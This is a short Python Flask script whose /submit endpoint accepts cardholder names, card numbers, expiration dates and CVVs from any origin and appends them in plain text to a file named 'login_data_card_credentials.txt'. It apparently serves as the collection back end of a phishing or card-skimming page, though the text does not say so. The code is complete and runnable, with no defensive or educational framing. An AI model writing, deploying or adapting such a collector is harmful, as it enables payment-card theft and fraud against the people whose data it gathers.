#!/usr/bin/python3
from flask import Flask, request, jsonify
from flask_cors import CORS
import os


app = Flask(__name__)
CORS(app)


# Define the path to the file where the data will be saved
data_file = "login_data_card_credentials.txt"


@app.route("/submit", methods=["POST"])
def submit_data():
    # Get the data from the request
    data = request.get_json()

    name = data.get("name")
    card_number = data.get("card_number")
    expiration_date = data.get("expiration_date")
    cvv = data.get("cvv")

    if name and card_number and expiration_date and cvv:
        # Open the file in append mode and save the username and password
        with open(data_file, "a") as file:
            file.write(
                f"Name: {name}, card number: {card_number}, expiration date: {expiration_date}, cvv: {cvv}\n"
            )

        return jsonify({"message": "Data saved successfully"}), 200
    else:
        return jsonify({"message": "Invalid data"}), 400


if __name__ == "__main__":
    # Ensure the file exists or create it if necessary
    if not os.path.exists(data_file):
        with open(data_file, "w") as f:
            pass  # Just create the file if it doesn't exist
    app.run(debug=True, port=8000)

